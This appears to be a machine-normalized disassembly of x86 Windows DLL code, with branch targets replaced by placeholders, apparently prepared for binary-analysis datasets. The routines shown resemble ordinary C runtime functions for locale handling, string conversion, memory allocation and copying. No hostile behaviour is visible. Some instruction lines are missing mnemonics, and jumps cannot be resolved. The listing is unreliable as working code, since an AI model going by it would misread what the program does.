cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x8 ] 0x0
jmp r-xdata
push esi
push 0x40
push r--data
call sub_1001e424
add esp 0xc
test eax eax
je r-xdata
call sub_1001e93c
jmp r-xdata
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ esi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
call sub_1001e9a3
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_1001e93c
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ esi + 0x18 ]
mov [ eax ] cx
mov cx [ esi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] di
xor eax eax
inc eax
jmp r-xdata
mov edi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ esi + 0x18 ]
call edi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_100178e5
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ esi + 0x1c ]
call edi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10010a44
add esp 0x14
jmp r-xdata
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_10016568
add esp 0x10
sub_1001ebd0
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_1001f5be
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10010789
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_1001f607
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_10011c31
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_10011a90
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10016c6f
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_1001338e
pop ecx
cmp eax ebx
je r-xdata
call sub_1001f7c0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_1001ed8a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1001ebd0
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001edcc
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_1001ee90
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_1001eee2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
inc esi
movzx eax [ esi ]
cmp eax 0x61
je r-xdata
mov ebx 0x109
cmp eax 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
mov edx 0x4000
xor ebx ebx
or [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp eax 0x77
je r-xdata
inc esi
inc esi
cmp [ esi ] di
jne r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
movzx eax ax
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
inc esi
movzx eax [ esi ]
cmp ax di
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_100167f3
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_10021f32
add esp 0x14
test eax eax
jne r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] edi
mov [ eax ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0x1c ] edi
mov [ eax + 0x10 ] ecx
cmp [ esi ] 0x20
je r-xdata
mov eax 0x1000
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
sub eax 0x20
je r-xdata
inc esi
inc esi
push 0x3
push esi
push r--data
call sub_100220e2
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
inc esi
movzx eax [ esi ]
cmp ax di
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x6
pop eax
jmp r-xdata
cmp ecx edi
je r-xdata
or ebx 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] ax
je r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
and ebx 0xfffffffe
and eax 0xfffffffc
or ebx 0x2
or eax 0x80
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
inc esi
cmp [ esi ] ax
je r-xdata
or ebx edx
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_1002203c
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
push 0x8
push r--data
push esi
call sub_1002203c
add esp 0xc
test eax eax
jne r-xdata
add esi 0xa
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_1002203c
add esp 0xc
test eax eax
jne r-xdata
add esi 0x10
or ebx 0x20000
jmp r-xdata
add esi 0xe
or ebx 0x10000
jmp r-xdata
sub_1001f196
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001f1f0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_1001f285
push 0xc
push r--data
call sub_10018984
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_100167f3
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_100189c9
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_10017fdf
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_1001bc96
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001f381
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_10011a90
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_1001f3a3
push 0x10
push r--data
call sub_10018984
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1001338e
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_10011c31
pop ecx
jmp r-xdata
call sub_100189c9
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_10017fdf
pop ecx
call sub_100167f3
push 0x4
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_1001b4b7
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001f4e7
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_1001b9b5
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_10017fdf
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_1001bc96
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_100167f3
call sub_100167f3
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_10017fdf
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100167b1
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_100167f3
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_100167f3
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_10017080
push ebx
call sub_1001b4b7
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_1001b4e7
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100167b1
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_10017080
push ebx
push [ ebp - 0x20 ]
call sub_1001b4e7
add esp 0x14
mov eax esi
sub_1001f5be
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_100215e0
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10010789
leave
retn
sub_1001f607
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10010789
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_10011a90
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_10016c6f
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_1001338e
pop ecx
cmp eax edi
je r-xdata
call sub_1001f7c0
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_10010990
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_100166ee
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_10011c31
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_1001f7ec
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_1001f873
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_1001f873
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_1001f7ec
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_1001f956
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_1001f9c1
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_100179c7
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_100179d0
pop ecx
test eax eax
je r-xdata
push eax
call sub_100179d0
pop ecx
test eax eax
je r-xdata
push eax
call sub_100179d0
push [ rw-data ]
mov esi eax
call sub_100179d0
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_10017955
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_10017955
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_10017955
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_10017955
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_10017955
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_100179d0
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_1001fb2a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_100167f3
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_1001fb75
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
push [ ebp + 0x18 ]
